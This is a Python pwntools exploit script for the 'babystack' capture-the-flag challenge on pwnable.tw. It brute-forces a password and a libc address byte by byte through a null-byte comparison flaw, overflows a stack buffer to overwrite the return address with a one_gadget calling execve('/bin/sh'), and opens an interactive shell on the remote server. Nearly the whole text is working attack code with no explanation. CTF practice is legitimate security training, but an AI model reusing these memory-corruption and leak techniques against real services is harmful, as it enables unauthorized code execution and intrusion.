#!/usr/bin/env python
from pwn import *
context.log_level="debug"
#p=process("./babystack",env={"LD_PRELOAD":"./libc_64.so.6"})
p=remote("chall.pwnable.tw",10205)
libc=ELF("./libc_64.so.6")
#gdb.attach(p)

def proof_of_work():
	pwd=''
	for _ in range(16):
		for i in range(1,0x100):
			p.recvuntil(">> ")
			p.sendline("1")
			payload=pwd+chr(i)+"\x00"
			p.recvuntil("Your passowrd :")
			p.send(payload)
			res = p.recvuntil("!\n")
			if(res == "Login Success !\n"):
				pwd+=chr(i)
				p.recvuntil(">> ")
				p.sendline("1")
				break
	return pwd

pwd = proof_of_work()
p.recvuntil(">> ")
p.sendline("1")
p.recvuntil("Your passowrd :")
'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL



0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
p.send("\x00"+"A"*0x3f+pwd+"A"*8)

p.recvuntil(">> ")
p.sendline("3")
p.recvuntil("Copy :")
p.send("A")

def leak_libc(password):
	pwd=password+"1\nAAAAAA\xb4"
	for _ in range(4):
		for i in range(1,0x101):
			if(i==0x100):
				print ("failed to pwned")
				break
			p.recvuntil(">> ")
			p.sendline("1")
			payload=pwd+chr(i)+"\x00"
			p.recvuntil("Your passowrd :")
			p.send(payload)
			res = p.recvuntil("!\n")
			if(res == "Login Success !\n"):
				pwd+=chr(i)
				p.recvuntil(">> ")
				p.sendline("1")
				break
	return pwd+"\x7f"
p.recvuntil(">> ")
p.sendline("1")
libc_base=u64(leak_libc(pwd)[-6:]+"\x00\x00")-0x6ffb4
print hex(libc_base)
one_gadget=libc_base+0x45216

p.recvuntil(">> ")
p.sendline("1")
p.recvuntil("Your passowrd :")
p.send("\x00"+"A"*0x3f+pwd+"A"*0x18+p64(one_gadget))

p.recvuntil(">> ")
p.sendline("3")
p.recvuntil("Copy :")
p.send("A")
p.recvuntil(">> ")
print hex(libc_base)
print hex(one_gadget)
p.sendline("2")
print hex(libc_base)
print hex(one_gadget)
p.interactive()
